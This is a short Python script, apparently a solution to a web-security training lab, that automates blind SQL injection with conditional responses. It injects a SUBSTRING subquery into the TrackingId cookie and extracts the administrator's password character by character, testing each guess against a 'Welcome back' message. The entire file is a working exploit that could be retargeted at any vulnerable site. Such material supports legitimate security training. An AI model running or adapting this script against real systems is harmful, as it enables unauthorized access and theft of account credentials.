#Blind SQL injection with conditional responses
import requests
characters= list('abcdefghijklmnopqrstuvwxyz'+'0123456789'+r'!@#$%^&{}><:"{}[]')

burp0_url = "https://0a9d000d04551d78821a9c2c00dc006b.web-security-academy.net:443/filter?category=Gifts"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
                  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
                  "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", 
                  "Referer": "https://0a9d000d04551d78821a9c2c00dc006b.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers"}
admin_password= []

for number in range(1,21):
    for character in characters:
        burp0_cookies = {"TrackingId": "2T7tOSgYRBtogWTm'+AND+(SELECT+SUBSTRING(password,{},1)+FROM+users+WHERE+username%3d'administrator')%3d'{}".format(number,character), 
                         "session": "GoCKercV5yOgdkAR1etpFEN4RqK5k5ss"}
         
        responce=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        if ('Welcome back') in responce.text:
            print(burp0_cookies)
            print(character)
            admin_password.append(character)
            break
        
admin_password = ''.join(admin_password)
print(admin_password)